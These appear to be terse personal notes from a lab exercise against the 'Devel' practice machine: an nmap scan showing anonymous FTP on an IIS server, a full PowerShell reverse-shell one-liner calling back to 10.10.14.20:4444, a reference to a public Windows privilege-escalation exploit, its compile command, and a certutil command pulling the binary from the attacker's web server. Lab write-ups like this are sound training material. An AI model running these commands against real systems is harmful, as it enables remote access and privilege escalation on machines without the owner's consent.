@@ -1,0 +1,35 @@
+Devel
+10.10.10.5
+└─$ nmap -A 10.10.10.5 -p 1-65535 -T5 -Pn
+Starting Nmap 7.93 ( https://nmap.org ) at 2024-08-17 17:39 CEST
+Nmap scan report for 10.10.10.5
+Host is up (0.045s latency).
+Not shown: 65533 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 03-18-17  02:06AM       <DIR>          aspnet_client
+| 08-17-24  06:19PM                 1442 cmd.aspx
+| 08-17-24  06:37PM                 2896 devel.aspx
+| 03-17-17  05:37PM                  689 iisstart.htm
+|_03-17-17  05:37PM               184946 welcome.png
+| ftp-syst: 
+|_  SYST: Windows_NT
+80/tcp open  http    Microsoft IIS httpd 7.5
+|_http-server-header: Microsoft-IIS/7.5
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: IIS7
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+http://10.10.10.5/cmd.aspx
+
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.20',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+
+https://www.exploit-db.com/exploits/40564
+i686-w64-mingw32-gcc 40564.c -o MS1p.exe -lws2_32    
+
+certutil.exe -urlcache -split -f http://10.10.14.20:8000/MS1p.exe
+
+edit exploit to rev shell as root
